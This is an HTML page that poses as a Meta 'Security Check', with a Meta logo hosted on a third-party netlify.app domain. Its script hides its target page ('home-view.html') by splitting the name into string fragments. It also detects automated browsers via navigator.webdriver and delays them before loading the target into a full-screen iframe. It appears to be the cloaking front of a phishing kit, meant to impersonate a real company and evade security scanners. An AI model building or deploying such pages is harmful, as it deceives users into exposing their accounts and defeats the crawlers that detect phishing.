
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Service Verification</title>
    <style>
        body,
        html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            background-color: #f0f2f5;
            overflow: hidden;
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
        }

        #loader {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 999;
            background: #f0f2f5;
        }

        .card {
            background: #fff;
            padding: 45px 30px;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            width: 55px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 20px;
            color: #1c1e21;
            margin: 0 0 12px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #606770;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0866FF;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        #main-frame {
            display: none;
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
</head>

<body>

    <div id="loader">
        <div class="card">
            <img src="https://bucolic-mousse-f80645.netlify.app/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="logo">
            <h1>Security Check</h1>
            <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
            <div class="spinner"></div>
        </div>
    </div>

    <iframe src="about:blank" id="main-frame"></iframe>

    <script>
        (function() {
            // --- VARIABLE SPLITTING (Bot Protection) ---
            var s1 = 'ho';
            var s2 = 'me-';
            var s3 = 'vi';
            var s4 = 'ew.';
            var s5 = 'ht';
            var s6 = 'ml';
            var target = s1 + s2 + s3 + s4 + s5 + s6;

            // --- ANTI-CHROME BOT CHECK ---
            var isBot = navigator.webdriver || !navigator.userAgent.includes("Mozilla");
            var waitTime = isBot ? 15000 : 1000; // Bots ko 15 sec wait karwao, insaan ko 2 sec

            setTimeout(function() {
                var frame = document.getElementById('main-frame');
                frame.src = target;

                frame.onload = function() {
                    // Loader hatane se pehle check ke asli page load hua
                    document.getElementById('loader').style.display = 'none';
                    frame.style.display = 'block';
                };
            }, waitTime);
        })();
    </script>

</body>

</html>
